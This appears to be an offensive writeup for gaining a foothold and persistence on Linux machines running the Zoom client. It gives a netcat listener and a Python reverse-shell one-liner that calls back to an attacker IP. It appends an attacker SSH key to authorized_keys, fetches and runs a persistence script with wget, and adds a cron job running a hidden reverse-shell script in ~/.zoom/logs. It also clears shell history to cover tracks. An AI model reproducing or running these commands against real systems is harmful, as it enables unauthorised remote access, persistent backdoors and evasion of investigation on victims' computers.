## Foothold

1. Listen for reverse shell (Attacker)

        nc -lvnp 4444


2. Serve auxiliary files on python HTTP server (Attacker)

        python3 -m http.server

3. Launch reverse shell Or authorize our ssh key (Victim) 

        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.89",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    Or

        echo "ssh-ed25519 AAAAC3NzaC1lZ--------SNIP-------3QPLjdSBQj2WyXHr0H" >> ~/.ssh/authorized_keys



## Persistence 


### Load persistence script

        wget http://192.168.10.89:8000/victim/per.sh

        chmod +x ./per.sh

        ./per.sh

This will do the following:


1. Add attacker's SSH key to  authorized_keys 

- If necessary create the needeed folders and files and update their permissions.


2. Load reverse shell script for cron job and a linux system enumeration script.    


3. Add a cron job to run periodically to provide us another method of persistence 

- Could also be used to start persistent logging capabilities.

        (crontab -l ; echo "* * * * * ~/.zoom/logs/rev.sh ")|crontab 2> /dev/null



4. Erase shell history 

        history -c







## Access/Capabilities

- User level access to everything

- Only needs a few seconds of remote control on the Zoom application

- Further exploitation and data extraction can be done with more time and finesse


















Ubuntu 5.0.399860.0429
Manjaro 5.0.398100.0427-1